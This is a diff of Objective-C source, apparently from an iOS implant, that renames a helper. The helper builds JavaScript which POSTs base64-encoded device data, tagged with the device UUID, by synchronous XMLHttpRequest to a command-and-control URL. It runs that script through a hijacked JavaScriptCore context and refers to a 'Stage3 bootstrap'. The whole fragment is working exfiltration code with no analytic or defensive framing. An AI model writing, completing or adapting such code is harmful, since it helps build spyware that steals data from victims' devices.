@@ -112,8 +112,8 @@ static NSString *c2_safe_str(const char *s) {
  * background dispatches can fire as long as the page is loaded. */
 static id g_saved_jsc = nil;
 
-/* Build JS that POSTs JSON via synchronous XHR; returns true iff HTTP 2xx. */
-static NSString *jsc_fetch_script(NSData *body, NSString *uuid) {
+/* Build JS that POSTs JSON via sync XMLHttpRequest — same _xhr idiom as Stage3 bootstrap load. */
+static NSString *jsc_xhr_script(NSData *body, NSString *uuid) {
     NSString *b64body = [body base64EncodedStringWithOptions:0];
     NSString *c2url   = [NSString stringWithFormat:@"%@://%s%s",
                          C2_USE_HTTPS ? @"https" : @"http",
@@ -121,12 +121,12 @@ static NSString *jsc_fetch_script(NSData *body, NSString *uuid) {
     return [NSString stringWithFormat:
         @"(function(){"
         @"try{"
-        @"var x=new XMLHttpRequest();"
-        @"x.open('POST','%@',false);"
-        @"x.setRequestHeader('Content-Type','application/json');"
-        @"x.setRequestHeader('X-Device-UUID','%@');"
-        @"x.send(atob('%@'));"
-        @"return x.status>=200&&x.status<300;"
+        @"var _xhr=new XMLHttpRequest();"
+        @"_xhr.open('POST','%@',false);"
+        @"_xhr.setRequestHeader('Content-Type','application/json');"
+        @"_xhr.setRequestHeader('X-Device-UUID','%@');"
+        @"_xhr.send(atob('%@'));"
+        @"return _xhr.status>=200&&_xhr.status<300;"
         @"}catch(e){return false;}"
         @"})();",
         c2url, uuid, b64body];
@@ -170,7 +170,7 @@ static bool upload_via_jsc_now(NSData *body, NSString *uuid) {
      * could race here (called from process() before coruna_constructor()). */
     if (!g_saved_jsc) g_saved_jsc = ctx;
 
-    NSString *script = jsc_fetch_script(body, uuid);
+    NSString *script = jsc_xhr_script(body, uuid);
     @try {
         return jsc_eval_script_yields_true(ctx, script);
     } @catch (...) {
@@ -229,7 +229,7 @@ static bool upload_via_jsc_dispatch(NSData *body, NSString *uuid) {
     if (![ctx respondsToSelector:evalSel]) return false;
 
     __strong id capturedCtx   = ctx;
-    NSString *capturedScript = jsc_fetch_script(body, uuid);
+    NSString *capturedScript = jsc_xhr_script(body, uuid);
 
     __block bool ok = false;
     void (^work)(void) = ^{
